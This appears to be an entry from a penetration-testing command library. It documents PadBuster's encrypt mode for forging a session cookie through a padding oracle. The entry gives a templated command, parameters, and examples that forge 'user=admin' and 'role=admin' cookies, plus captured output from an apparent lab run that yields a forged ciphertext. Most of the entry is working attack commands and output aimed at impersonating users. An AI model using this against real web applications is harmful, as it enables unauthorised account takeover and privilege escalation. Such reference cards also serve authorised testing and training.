---
id: 53e08a6a-364e-4e79-a16d-45db57c1e2c3
name: padbuster-encrypt-plaintext-to-cookie
type: command
executor: bash
data: >-
  padbuster http://$_TARGET_URL $_COOKIE $_BLOCK_SIZE -cookies
  $_COOKIE_NAME=$_COOKIE -encoding 0 -plaintext $_NEW_PLAINTEXT
output: >-
  root@kali:~# padbuster http://10.10.10.18 vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2 8
  -cookies 'auth=vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2' -encoding 0 -plaintext
  user=admin


  +-------------------------------------------+

  | PadBuster - v0.3.3                        |

  | Brian Holyfield - Gotham Digital Science  |

  | labs@gdssecurity.com                      |

  +-------------------------------------------+


  INFO: The original request returned the following

  [+] Status: 200

  [+] Location: N/A

  [+] Content Length: 978


  INFO: Starting PadBuster Encrypt Mode

  [+] Number of Blocks: 2


  INFO: No error string was provided...starting response analysis


  *** Response Analysis Complete ***


  The following response signatures were returned:


  -------------------------------------------------------

  ID#     Freq    Status  Length  Location

  -------------------------------------------------------

  1       1       200     1133    N/A

  2 **    255     200     15      N/A

  -------------------------------------------------------


  Enter an ID that matches the error condition

  NOTE: The ID# marked with ** is recommended : 2

  ...

  ...

  Block 1 Results:

  [+] New Cipher Text (HEX): 0408ad19d62eba93

  [+] Intermediate Bytes (HEX): 717bc86beb4fdefe


  -------------------------------------------------------

  ** Finished ***


  [+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA

  -------------------------------------------------------
created_at: '2019-10-24T00:47:43.802011+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - cryptography
  - web
verified: true
validated: true
---

# padbuster-encrypt-plaintext-to-cookie

## Command

```bash
padbuster http://$_TARGET_URL $_COOKIE $_BLOCK_SIZE -cookies $_COOKIE_NAME=$_COOKIE -encoding 0 -plaintext $_NEW_PLAINTEXT
```

## Description

This command uses PadBuster in encrypt mode to forge a new ciphertext cookie from desired plaintext by leveraging the padding oracle to compute valid encryptions block-by-block, enabling user impersonation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| http://$_TARGET_URL | The vulnerable endpoint URL that processes the cookie | Yes |
| $_COOKIE | The original base64url-encoded ciphertext cookie (used as base) | Yes |
| $_BLOCK_SIZE | Cipher block size (e.g., 8 for 3DES, 16 for AES) | Yes |
| -cookies $_COOKIE_NAME=$_COOKIE | Sets the cookie header for requests; replace with actual name/value | Yes |
| -encoding 0 | Uses raw byte encoding (0); alternatives: 1 for base64url, 2 for hex | Yes |
| -plaintext $_NEW_PLAINTEXT | The plaintext to encrypt (e.g., 'user=admin') | Yes |

## Examples

### Basic Usage

```bash
padbuster http://example.com/login original_cookie 8 -cookies auth=original_cookie -encoding 0 -plaintext 'user=admin'
```

### Advanced Usage

```bash
padbuster http://example.com/login $_COOKIE 16 -cookies session=$_COOKIE -encoding 1 -plaintext 'role=admin' --verbose
```

## Expected Output

The command runs interactively, selecting error ID and computing blocks. Upon success:

```
[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
Block 1 Results:
[+] New Cipher Text (HEX): 0408ad19d62eba93
[+] Intermediate Bytes (HEX): 717bc86beb4fdefe
```

Use the encrypted value to replace the original cookie.

## Related

- [[procedures/Padding-Oracle-Attack-on-Cookies]]
- [[commands/padbuster-decrypt-cookie]]
